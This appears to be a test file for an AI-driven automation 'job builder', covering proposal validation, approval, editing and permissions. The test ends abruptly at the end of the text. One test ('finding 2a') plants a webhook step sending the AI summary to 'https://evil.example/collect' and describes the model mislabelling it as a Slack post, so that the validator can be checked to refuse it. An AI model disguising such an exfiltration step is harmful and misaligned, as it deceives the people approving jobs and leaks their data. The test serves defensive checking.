// The RevBox Job Builder's engine side (GET-868): the server check of a proposed job, approve -> a
// paused workflow-engine routine on the box, the box context every AI step reads, and the
// revbox_delivery step that posts to the box's destinations as they are at run time.
//
// Run: pnpm --filter @nous/core build && node --test packages/core/test/revboxBuilder.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import { validateBuilderProposal, approveBuilderProposal, sanitizeBuilderTranscript, RESULT_NOT_CARRIED, latestBuilderSessionForJob, openBuilderSessionForJob, builderSessionHistory, seedTranscriptFromApproved, APPROVED_NOTE, createBuilderSession, getBuilderSession, saveBuilderSession, setBuilderSessionState, listRevboxRoutines, builderRoutineColumns, proposalFacts, revboxJobDeliveries, listRevboxJobDeliveries } from '../dist/db/revboxBuilder.mjs';
import { runStepsForTest as runSteps, registerStepHandler, withBoxContextForTest as withBoxContext, revboxContextText, REVBOX_CONTEXT_CHARS } from '../dist/services/automationRun.mjs';

// The Product Usage reference case from docs/revboxes/JOB_BUILDER.md.
const dailyReport = () => ({
  name: 'Product Usage daily summary',
  summary: 'Every morning at 08:00 New York time: read yesterday\'s Product Usage numbers per account, write the summary, post it to #product-usage-cs-handoff.',
  trigger: { kind: 'clock', config: { frequency: 'daily', at: '08:00' }, timezone: 'America/New_York', label: 'Every day at 08:00 (New York)' },
  steps: [
    { id: 'read', type: 'hubspot', config: { action: 'read', object: '2-9000001', object_label: 'Account Daily Usage',
      fields: ['product_usage_a', 'product_usage_b', 'product_usage_c', 'product_usage_d', 'product_usage_e'],
      field_labels: { product_usage_a: 'A' }, group_by: 'company_name', date_property: 'date', window: 'yesterday', compare: true } },
    { id: 'summary', type: 'agent', config: { mode: 'write', model: 'opennous', prompt: 'Write the VP summary of yesterday\'s Product Usage usage per account.' } },
    { id: 'post', type: 'slack', config: { action: 'channel', channel_id: 'C0TU', channel: 'product-usage-cs-handoff', text: '{{steps.summary.output}}' } },
  ],
  display: [
    { step_id: 'read', tool: 'hubspot', title: 'Read Account Daily Usage', detail: '5 Product Usage fields' },
    { step_id: 'summary', tool: 'agent', title: 'Write the summary' },
    { step_id: 'post', tool: 'slack', title: 'Post to #product-usage-cs-handoff' },
  ],
  uses_box_delivery: true,
  warnings: [{ kind: 'unverified', message: 'No rows yesterday to preview.' }],
  assumptions: ['Weekends are reported as quiet days.'],
  estimated_credits_per_run: 2,
});
const lookups = { slackChannelIds: ['C0TU', 'C0OTHER'], mailboxIds: ['mbx-1'] };

test('the Product Usage reference flow passes', () => {
  const r = validateBuilderProposal(dailyReport(), lookups);
  assert.deepEqual(r.errors, []);
  assert.equal(r.ok, true);
  assert.equal(r.trigger.timezone, 'America/New_York');
  assert.deepEqual(r.steps.map(s => s.id), ['read', 'summary', 'post']);
});

test('a Slack channel that is not in the workspace is refused, and a name alone is not enough', () => {
  const p = dailyReport(); p.steps[2].config.channel_id = 'C0NOPE';
  const r = validateBuilderProposal(p, lookups);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /C0NOPE.*not found/);
  delete p.steps[2].config.channel_id;
  assert.match(validateBuilderProposal(p, lookups).errors.join(' '), /channel_id/);
});

test('a HubSpot read without fields or object is refused', () => {
  const p = dailyReport(); p.steps[0].config.fields = [];
  assert.match(validateBuilderProposal(p, lookups).errors.join(' '), /at least one field/);
  const q = dailyReport(); delete q.steps[0].config.object;
  assert.match(validateBuilderProposal(q, lookups).errors.join(' '), /object to read/);
});

test('{{steps.X.output}} must point at an earlier step that writes something', () => {
  const later = dailyReport(); later.steps[1].config.prompt = 'Use {{steps.post.output}}';
  assert.match(validateBuilderProposal(later, lookups).errors.join(' '), /runs after it/);
  const missing = dailyReport(); missing.steps[2].config.text = '{{steps.nothing.output}}';
  assert.match(validateBuilderProposal(missing, lookups).errors.join(' '), /no step "nothing"/);
  const silent = dailyReport();
  silent.steps.splice(2, 0, { id: 'gate', type: 'approval', config: {} });
  silent.display.push({ step_id: 'gate', title: 'Approval' });
  silent.steps[3].config.text = '{{steps.gate.output}}';
  assert.match(validateBuilderProposal(silent, lookups).errors.join(' '), /writes no output/);
});

test('display covers every step, the trigger has a runner, Gmail names a real mailbox, Wait is refused', () => {
  const p = dailyReport(); p.display.pop();
  assert.match(validateBuilderProposal(p, lookups).errors.join(' '), /"post" has no display line/);
  const t = dailyReport(); t.trigger = { kind: 'webhook_in', config: {} };
  assert.match(validateBuilderProposal(t, lookups).errors.join(' '), /no runner/);
  const tz = dailyReport(); tz.trigger.timezone = 'Mars/Olympus';
  assert.match(validateBuilderProposal(tz, lookups).errors.join(' '), /timezone/);
  const g = dailyReport();
  g.steps.push({ id: 'mail', type: 'gmail', config: { mode: 'draft', to: 'vp@x.example', body: '{{steps.summary.output}}', send_from: { id: 'mbx-9', kind: 'gmail' } } });
  g.display.push({ step_id: 'mail', title: 'Draft' });
  assert.match(validateBuilderProposal(g, lookups).errors.join(' '), /mbx-9 is not a connected mailbox/);
  g.steps[3].config.send_from.id = 'mbx-1';
  assert.equal(validateBuilderProposal(g, lookups).ok, true);
  const w = dailyReport(); w.steps.push({ id: 'w', type: 'wait', config: { amount: 1, unit: 'days' } }); w.display.push({ step_id: 'w', title: 'Wait' });
  assert.match(validateBuilderProposal(w, lookups).errors.join(' '), /Wait steps do not run yet/);
});

// ── A fake database: just enough of supabase-js for these modules ───────────────
function database(seed = {}) {
  const tables = {
    workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'admin' }, { workspace_id: 'ws', user_id: 'viewer', role: 'member' }],
    revboxes: [{ id: 'box', workspace_id: 'ws', owner_id: 'owner', shared: true, name: 'Product Usage CS', objective: 'Keep CS ahead of Product Usage usage drops.', blocks: [{ id: 'b1', title: 'Tone', body: 'Plain, numbers first.' }], delivery: [] }],
    revbox_members: [], revbox_context: [], revbox_builder_sessions: [], agent_routines: [], documents: [],
    ...seed,
  };
  let seq = 0;
  class Query {
    constructor(table) { this.table = table; this.filters = []; }
    select() { return this; } order() { return this; } limit() { return this; }
    eq(k, v) { this.filters.push(r => r[k] === v); return this; }
    neq(k, v) { this.filters.push(r => r[k] !== v); return this; }
    in(k, vs) { this.filters.push(r => vs.includes(r[k])); return this; }
    insert(v) { this.insertValue = v; return this; }
    update(v) { this.updateValue = v; return this; }
    result(single) {
      let values = (tables[this.table] ??= []).filter(r => this.filters.every(f => f(r)));
      if (this.insertValue) { const row = structuredClone({ id: `${this.table}-${++seq}`, ...this.insertValue }); tables[this.table].push(row); values = [row]; }
      if (this.updateValue) for (const row of values) Object.assign(row, structuredClone(this.updateValue));
      return { data: structuredClone(single ? values[0] ?? null : values), error: null };
    }
    maybeSingle() { return Promise.resolve(this.result(true)); }
    single() { return this.maybeSingle(); }
    then(ok, bad) { return Promise.resolve(this.result(false)).then(ok, bad); }
  }
  return { tables, from: t => new Query(t) };
}

test('approve makes one routine on the box, switched on, with the legacy columns, ending in box delivery', async () => {
  const sb = database();
  const session = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: session.id, messages: [{ role: 'user', content: 'Product Usage every morning' }], proposal: dailyReport() });
  const before = Date.now();
  const out = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: session.id, name: 'Morning report', ...lookups });
  const { routine } = out;
  assert.equal(routine.name, 'Morning report');
  assert.equal(routine.revbox_id, 'box');
  assert.equal(routine.user_id, 'owner');
  // Approving switches it on (GET-868 polish), with its next 08:00 New York slot.
  assert.equal(out.enabled, true);
  assert.equal(out.reason, undefined);
  assert.equal(routine.enabled, true);
  const next = new Date(routine.next_run_at);
  assert.ok(next.getTime() > before && next.getTime() <= before + 25 * 3600e3, `next_run_at ${routine.next_run_at}`);
  assert.equal(new Intl.DateTimeFormat('en-GB', { timeZone: 'America/New_York', hour: '2-digit', minute: '2-digit', hourCycle: 'h23' }).format(next), '08:00');
  assert.equal(routine.trigger_kind, 'clock');
  assert.deepEqual(routine.trigger_config, { frequency: 'daily', at: '08:00' });
  assert.equal(routine.frequency, 'daily');
  assert.equal(routine.at_time, '08:00');
  assert.equal(routine.offset_minutes, null);
  assert.equal(routine.timezone, 'America/New_York');
  assert.equal(routine.destination, 'slack');
  assert.equal(routine.destination_target, 'product-usage-cs-handoff');
  assert.equal(routine.artifact, null);
  assert.match(routine.prompt, /VP summary/);
  assert.deepEqual(routine.steps.map(s => s.type), ['hubspot', 'agent', 'slack', 'revbox_delivery']);
  const saved = sb.tables.revbox_builder_sessions[0];
  assert.equal(saved.state, 'approved');
  assert.equal(saved.job_id, routine.id);
  // Pressing Approve again makes nothing new.
  await assert.rejects(approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: session.id }), e => e.status === 409);
  assert.equal(sb.tables.agent_routines.length, 1);
  assert.equal((await listRevboxRoutines(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer' })).length, 1);
});

test('Edit updates the same routine and keeps it on; an invalid proposal changes nothing', async () => {
  const sb = database();
  const first = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const { routine } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: first.id, proposal: dailyReport(), ...lookups });
  sb.tables.agent_routines[0].enabled = true;
  const edit = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const bad = dailyReport(); bad.steps[2].config.channel_id = 'C0NOPE';
  await assert.rejects(approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: edit.id, proposal: bad, ...lookups }), e => e.status === 400 && /C0NOPE/.test(e.message));
  assert.equal(sb.tables.revbox_builder_sessions[1].state, 'open');
  const weekly = dailyReport(); weekly.trigger.config = { frequency: 'weekly', at: '09:30' }; weekly.uses_box_delivery = false;
  const { routine: again } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: edit.id, proposal: weekly, ...lookups });
  assert.equal(again.id, routine.id);
  assert.equal(sb.tables.agent_routines.length, 1);
  assert.equal(again.enabled, true);
  assert.ok(again.next_run_at);
  assert.equal(again.frequency, 'weekly');
  assert.equal(again.at_time, '09:30');
  assert.deepEqual(again.steps.map(s => s.type), ['hubspot', 'agent', 'slack']);
});

test('only an owner or editor builds jobs; a session is read with the same rights', async () => {
  const sb = database();
  await assert.rejects(createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer' }), e => e.status === 403);
  await assert.rejects(createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: 'not-a-job' }), e => e.status === 404);
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  assert.equal((await getBuilderSession(sb, { workspaceId: 'ws', userId: 'owner', sessionId: s.id })).id, s.id);
  assert.equal(await getBuilderSession(sb, { workspaceId: 'ws', userId: 'owner', sessionId: s.id, revboxId: 'other-box' }), null);
  await assert.rejects(getBuilderSession(sb, { workspaceId: 'ws', userId: 'viewer', sessionId: s.id }), e => e.status === 403);
  await assert.rejects(approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer', sessionId: s.id, proposal: dailyReport() }), e => e.status === 403);
});

// ── Approve switches the job on; Edit reopens its chat (GET-868 polish) ──────────

test('a failed switch-on check still saves the job, off, with the reason', async () => {
  const sb = database();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const seen = [];
  const enableCheck = async (arg) => { seen.push(arg); return 'Your plan includes 3 automations. Pause or delete one first.'; };
  const out = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, proposal: dailyReport(), enableCheck, ...lookups });
  assert.equal(out.enabled, false);
  assert.match(out.reason, /Pause or delete one/);
  assert.equal(out.routine.enabled, false);
  assert.equal(out.routine.next_run_at, null);
  assert.equal(sb.tables.agent_routines.length, 1);
  assert.equal(sb.tables.revbox_builder_sessions[0].state, 'approved');
  assert.deepEqual(seen.map(a => [a.isNew, a.routineId, a.trigger.kind]), [[true, null, 'clock']]);
  // A check that throws (the credit gate's 402) is a reason too; an edit of a job that is on tells the check it is one.
  sb.tables.agent_routines[0].enabled = true;
  const edit = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: out.routine.id });
  const gate = async ({ isNew }) => { assert.equal(isNew, false); throw Object.assign(new Error('Credits are required.'), { status: 402 }); };
  const again = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: edit.id, proposal: dailyReport(), enableCheck: gate, ...lookups });
  assert.deepEqual([again.enabled, again.reason, again.routine.enabled], [false, 'Credits are required.', false]);
  // A check that passes keeps a job that is on, on (an Edit never switches a paused job on: review 6).
  sb.tables.agent_routines[0].enabled = true;
  const third = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: out.routine.id });
  const on = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: third.id, proposal: dailyReport(), enableCheck: async () => null, ...lookups });
  assert.deepEqual([on.enabled, on.routine.enabled, !!on.routine.next_run_at], [true, true, true]);
  // An event job is on with no clock slot.
  const ev = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const won = dailyReport(); won.trigger = { kind: 'deal_closed_won', config: {} };
  const evOut = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: ev.id, proposal: won, ...lookups });
  assert.deepEqual([evOut.enabled, evOut.routine.next_run_at], [true, null]);
});

/** A transcript as the loop writes it: hints, tool noise, an ask answered, a failed and a good proposal. */
function transcript() {
  const p = dailyReport();
  return [
    { role: 'user', content: [{ type: 'text', text: "[Context from the composer, not the user's words]\nIntegrations the user attached: hubspot.\nTrigger the user picked: none.\n\nProduct Usage report every morning to Slack" }] },
    { role: 'assistant', content: [{ type: 'thinking', thinking: 'secret', signature: 'x' }, { type: 'text', text: 'Let me look.' }, { type: 'tool_use', id: 't1', name: 'hubspot_find', input: { query: 'credit' } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: '{"objects":[]}' }] },
    { role: 'assistant', content: [{ type: 'text', text: 'Found it.' }, { type: 'tool_use', id: 'a1', name: 'ask', input: { questions: [{ id: 'time', header: 'Time', question: 'When should it arrive?', multi: false, options: [{ label: '08:00' }, { label: '07:00' }] }, { id: 'channel', header: 'Channel', question: 'Which channel?', multi: false, options: [{ label: '#a' }, { label: '#b' }] }] } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'a1', content: 'The user answered:\n\nWhen should it arrive?\n-> 08:00\n\nWhich channel?\n-> #a; Other: and DM me' }] },
    { role: 'assistant', content: [{ type: 'tool_use', id: 'p0', name: 'propose_job', input: { name: 'Broken' } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'p0', content: 'The proposal did not validate.', is_error: true }] },
    { role: 'assistant', content: [{ type: 'text', text: 'Here is the job.' }, { type: 'tool_use', id: 'p1', name: 'propose_job', input: { ...p, name: 'Model name' } }] },
  ];
}

test('history: the chat as the UI shows it, without tool noise', () => {
  const approved = { ...dailyReport(), name: 'Approved name', facts: [{ step_id: 'read' }] };
  const h = builderSessionHistory(transcript(), { proposal: approved, approved: true });
  assert.deepEqual(h.map(i => i.kind ?? i.role), ['user', 'assistant', 'ask', 'assistant', 'proposal']);
  assert.equal(h[0].text, 'Product Usage report every morning to Slack');
  assert.equal(h[1].text, 'Let me look.\n\nFound it.');
  assert.equal(h[3].text, 'Here is the job.');
  assert.equal(h[2].questions.length, 2);
  assert.deepEqual(h[2].answers, [{ question: 'When should it arrive?', answer: '08:00' }, { question: 'Which channel?', answer: '#a; Other: and DM me' }]);
  assert.equal(h[4].approved, true);
  assert.equal(h[4].proposal.name, 'Approved name');
  assert.ok(!JSON.stringify(h).includes('secret') && !JSON.stringify(h).includes('hubspot_find') && !JSON.stringify(h).includes('Broken'));
  // Not approved: the card is the session's proposal, not approved.
  assert.equal(builderSessionHistory(transcript(), { proposal: approved }).at(-1).approved, false);
  // Free text instead of answers is the user's words.
  const free = transcript().slice(0, 5);
  free[4] = { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'a1', content: 'The user did not pick an option and wrote instead:\n\nJust do 9am' }] };
  const fh = builderSessionHistory(free);
  // Nothing answered it yet (GET-889): the chat says the turn got no answer.
  assert.deepEqual(fh.slice(-3).map(i => [i.kind ?? i.role, i.text ?? i.answers.length]), [['ask', 0], ['user', 'Just do 9am'], ['failed', 'This message did not get an answer. Try again.']]);
});

test('Edit: the approved chat is linked to its job and reopened as a new session for the editor', async () => {
  const sb = database({ revbox_members: [{ workspace_id: 'ws', revbox_id: 'box', user_id: 'editor', role: 'editor' }, { workspace_id: 'ws', revbox_id: 'box', user_id: 'viewer', role: 'viewer' }],
    workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'admin' }, { workspace_id: 'ws', user_id: 'editor', role: 'member' }, { workspace_id: 'ws', user_id: 'viewer', role: 'member' }, { workspace_id: 'ws', user_id: 'outsider', role: 'member' }] });
  sb.tables.revboxes[0].shared = false;
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', messages: transcript(), proposal: dailyReport() });
  const { routine } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, name: 'Approved name', ...lookups });
  assert.equal(sb.tables.revbox_builder_sessions[0].job_id, routine.id);
  // Any editor of the box may read the job's latest chat; a viewer or an outsider may not.
  assert.equal((await latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: routine.id })).id, s.id);
  await assert.rejects(latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer', jobId: routine.id }), e => e.status === 403);
  await assert.rejects(latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'outsider', jobId: routine.id }), e => e.status === 403 || e.status === 404);
  await assert.rejects(latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: 'nope' }), e => e.status === 404);
  // The newest wins.
  sb.tables.revbox_builder_sessions.push({ id: 'older', workspace_id: 'ws', revbox_id: 'box', user_id: 'owner', job_id: routine.id, state: 'approved', messages: [], updated_at: '2000-01-01T00:00:00Z' });
  assert.equal((await latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id })).id, s.id);

  // Edit as the editor: a new open session of theirs, on the job, seeded with the approved chat.
  const opened = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: routine.id });
  assert.notEqual(opened.session.id, s.id);
  assert.equal(opened.source_session_id, s.id);
  const row = sb.tables.revbox_builder_sessions.find(r => r.id === opened.session.id);
  assert.deepEqual([row.user_id, row.job_id, row.state, row.proposal.name], ['editor', routine.id, 'open', 'Approved name']);
  // The transcript is valid to continue: the approved proposal answered, its input the approved job.
  // The editor is not the person who made it (review 1): only the approved proposal is carried over.
  const last = row.messages.at(-1);
  assert.equal(last.role, 'user');
  assert.deepEqual(last.content, [{ type: 'tool_result', tool_use_id: 'toolu_approved_job', content: APPROVED_NOTE }]);
  assert.equal(row.messages.at(-2).content.find(b => b.name === 'propose_job').input.name, 'Approved name');
  assert.equal(row.messages.at(-2).content.find(b => b.name === 'propose_job').input.facts, undefined);
  assert.deepEqual(opened.history.map(i => i.kind ?? i.role), ['assistant', 'proposal']);
  assert.deepEqual([opened.history.at(-1).approved, opened.history.at(-1).proposal.name], [true, 'Approved name']);
  // The creator's own Edit still shows their chat.
  const mine = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  assert.deepEqual(mine.history.map(i => i.kind ?? i.role), ['user', 'assistant', 'ask', 'assistant', 'proposal']);
  const mineRow = sb.tables.revbox_builder_sessions.find(r => r.id === mine.session.id);
  assert.deepEqual(mineRow.messages.at(-1).content, [{ type: 'tool_result', tool_use_id: 'p1', content: APPROVED_NOTE }]);
  // The original chat is untouched; only its creator continues it.
  assert.equal(sb.tables.revbox_builder_sessions[0].messages.length, transcript().length);
  // A viewer cannot open it.
  await assert.rejects(openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer', jobId: routine.id }), e => e.status === 403);
  // Approving the edit session updates the same routine; the session stays linked.
  const again = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: (await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id })).session.id, ...lookups });
  assert.equal(again.routine.id, routine.id);
  assert.equal(sb.tables.agent_routines.length, 1);
  // A later Edit shows both approvals, the earlier one approved too.
  const third = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  assert.ok(third.history.filter(i => i.kind === 'proposal').every(i => i.approved));
});

test('Edit on a job with no chat behind it opens on its current setup (GET-873)', async () => {
  const sb = database({ agent_routines: [{ id: 'legacy', workspace_id: 'ws', revbox_id: 'box', user_id: 'owner', name: 'Old' }] });
  const opened = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: 'legacy' });
  assert.deepEqual([opened.history.map(i => i.kind ?? i.role), opened.source_session_id, opened.session.job_id], [['proposal'], null, 'legacy']);
  assert.deepEqual(seedTranscriptFromApproved([{ role: 'user', content: 'x' }], null), [{ role: 'user', content: 'x' }]);
});

// ── Review findings (GET-858): what the card shows comes from the real steps ─────

const people = { slackChannels: [{ id: 'C0TU', name: 'product-usage-cs-handoff' }, { id: 'C0OTHER', name: 'random' }], slackPeople: [{ id: 'U1', name: 'Dana Vp' }], mailboxes: [{ id: 'mbx-1', kind: 'gmail', email: 'cs@acme.example' }] };

test('finding 2a: a display line whose tool does not match its step type is refused', () => {
  const p = dailyReport();
  p.steps[2] = { id: 'post', type: 'webhook', config: { url: 'https://evil.example/collect', body: '{{steps.summary.output}}' } };
  // The model labels the exfiltration step as a Slack post.
  const r = validateBuilderProposal(p, lookups);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /Display line "Post to #product-usage-cs-handoff".*"slack".*webhook/);
  p.display[2].tool = 'webhook';
  assert.equal(validateBuilderProposal(p, lookups).ok, true);
  // agent steps may be labelled ai or agent; a step may not be shown twice.
  const q = dailyReport(); q.display[1].tool = 'ai';
  assert.equal(validateBuilderProposal(q, lookups).ok, true);
  q.display.push({ step_id: 'post', tool: 'slack', title: 'Also post' });
  assert.match(validateBuilderProposal(q, lookups).errors.join(' '), /"post" has more than one display line/);
});

test('finding 2b: facts are derived from the real steps, one per step', () => {
  const p = dailyReport();
  p.steps.push(
    { id: 'hook', type: 'webhook', config: { url: 'https://hooks.partner.example/in?x=1', body: '{{steps.summary.output}}' } },
    { id: 'mail', type: 'gmail', config: { mode: 'send', to: 'vp@x.example', cc: 'cfo@x.example', body: '{{steps.summary.output}}', send_from: { id: 'mbx-1', kind: 'gmail' } } },
    { id: 'dm', type: 'slack', config: { action: 'dm', user_id: 'U1', text: 'hi' } },
    { id: 'upd', type: 'hubspot', config: { action: 'update_deal', fill: 'manual', properties: [{ name: 'dealstage', value: 'won' }] } },
  );
  p.steps[1].config.model = 'claude-sonnet-5';
  p.display.push({ step_id: 'hook', tool: 'webhook', title: 'Send' }, { step_id: 'mail', tool: 'gmail', title: 'Mail' }, { step_id: 'dm', tool: 'slack', title: 'DM' }, { step_id: 'upd', tool: 'hubspot', title: 'Update' });
  const r = validateBuilderProposal(p, { ...lookups, ...people, slackUserIds: ['U1'] });
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.facts.map(f => [f.step_id, f.type]), [['read', 'hubspot'], ['summary', 'agent'], ['post', 'slack'], ['hook', 'webhook'], ['mail', 'gmail'], ['dm', 'slack'], ['upd', 'hubspot']]);
  const by = Object.fromEntries(r.facts.map(f => [f.step_id, f]));
  assert.equal(by.read.access, 'read');
  assert.equal(by.read.object, '2-9000001');
  assert.deepEqual(by.read.fields, ['product_usage_a', 'product_usage_b', 'product_usage_c', 'product_usage_d', 'product_usage_e']);
  assert.match(by.read.target, /Read .*2-9000001.*product_usage_a/);
  assert.equal(by.summary.model, 'claude-sonnet-5');
  assert.match(by.summary.target, /claude-sonnet-5/);
  // The channel name comes from the workspace's Slack, not from the model's config.
  assert.equal(by.post.target, '#product-usage-cs-handoff (C0TU)');
  assert.equal(by.post.external, false);
  assert.equal(by.hook.host, 'hooks.partner.example');
  assert.equal(by.hook.url, 'https://hooks.partner.example/in?x=1');
  assert.equal(by.hook.external, true);
  assert.deepEqual(by.hook.sends_to, ['hooks.partner.example']);
  assert.deepEqual(by.mail.recipients, ['vp@x.example', 'cfo@x.example']);
  assert.equal(by.mail.mailbox, 'cs@acme.example');
  assert.deepEqual(by.mail.sends_to, ['vp@x.example', 'cfo@x.example']);
  assert.match(by.mail.target, /cs@acme\.example/);
  assert.equal(by.dm.target, 'DM to Dana Vp (U1)');
  assert.equal(by.upd.access, 'write');
  assert.deepEqual(by.upd.fields, ['dealstage']);
  // A Slack channel name the model wrote that is not the real one is not trusted.
  const lie = dailyReport(); lie.steps[2].config.channel = 'cs-handoff';
  assert.equal(proposalFacts(lie, people).find(f => f.step_id === 'post').target, '#product-usage-cs-handoff (C0TU)');
  assert.equal(proposalFacts(lie, {}).find(f => f.step_id === 'post').target, 'Slack channel C0TU (named "cs-handoff" by the builder, not checked)');
  // Failing proposals still carry facts for whatever steps there are.
  assert.ok(Array.isArray(validateBuilderProposal({ ...p, name: '' }, lookups).facts));
});

test('finding 10b: an explicit Slack post to a box destination is refused when the box delivers too', () => {
  const p = dailyReport();
  const r = validateBuilderProposal(p, { ...lookups, ...people, boxDestinations: [{ id: 'd1', kind: 'slack', target: 'C0TU' }] });
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /"post".*already.*box.*(drop|remove).*uses_box_delivery/i);
  // Matched by the channel's real name as well (destinations are often "#name").
  assert.equal(validateBuilderProposal(p, { ...lookups, ...people, boxDestinations: [{ kind: 'slack', target: '#product-usage-cs-handoff' }] }).ok, false);
  // Fine without box delivery, or to another channel.
  assert.equal(validateBuilderProposal({ ...p, uses_box_delivery: false }, { ...lookups, boxDestinations: [{ kind: 'slack', target: 'C0TU' }] }).ok, true);
  assert.equal(validateBuilderProposal(p, { ...lookups, boxDestinations: [{ kind: 'slack', target: 'C0OTHER' }, { kind: 'webhook', target: 'https://x.example' }] }).ok, true);
});

test('finding 3: a turn save never changes the state, and a save after approval is a no-op', async () => {
  const sb = database();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', messages: [{ role: 'user', content: 'a' }], proposal: dailyReport() });
  await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, ...lookups });
  const row = sb.tables.revbox_builder_sessions[0];
  assert.equal(row.state, 'approved');
  // A turn that was still streaming saves afterwards, with the loop's state: 'open'.
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, messages: [{ role: 'user', content: 'late' }], proposal: { ...dailyReport(), name: 'Late' }, state: 'open' });
  assert.equal(row.state, 'approved');
  assert.equal(row.messages[0].content, 'a');
  assert.notEqual(row.proposal.name, 'Late');
  // The explicit path still moves state.
  await setBuilderSessionState(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', state: 'abandoned' });
  assert.equal(row.state, 'abandoned');
  await assert.rejects(setBuilderSessionState(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', state: 'nope' }), e => e.status === 400);
});

test('finding 10a: a session belongs to the person who started it', async () => {
  const sb = database({ revbox_members: [{ workspace_id: 'ws', revbox_id: 'box', user_id: 'editor', role: 'editor' }], workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'admin' }, { workspace_id: 'ws', user_id: 'editor', role: 'member' }] });
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', proposal: dailyReport() });
  assert.equal(await getBuilderSession(sb, { workspaceId: 'ws', userId: 'editor', sessionId: s.id }), null);
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'editor', messages: [{ role: 'user', content: 'hijack' }] });
  assert.deepEqual(sb.tables.revbox_builder_sessions[0].messages, []);
  await assert.rejects(approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', sessionId: s.id, ...lookups }), e => e.status === 404);
  assert.equal(sb.tables.agent_routines.length, 0);
  await assert.rejects(setBuilderSessionState(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'editor', state: 'abandoned' }), e => e.status === 404);
});

test('finding 9: Make changes on someone else\'s job needs the box owner or a workspace admin, and the job then runs as the approver', async () => {
  const seed = () => database({
    revbox_members: [{ workspace_id: 'ws', revbox_id: 'box', user_id: 'editor', role: 'editor' }, { workspace_id: 'ws', revbox_id: 'box', user_id: 'editor2', role: 'editor' }, { workspace_id: 'ws', revbox_id: 'box', user_id: 'wsadmin', role: 'editor' }],
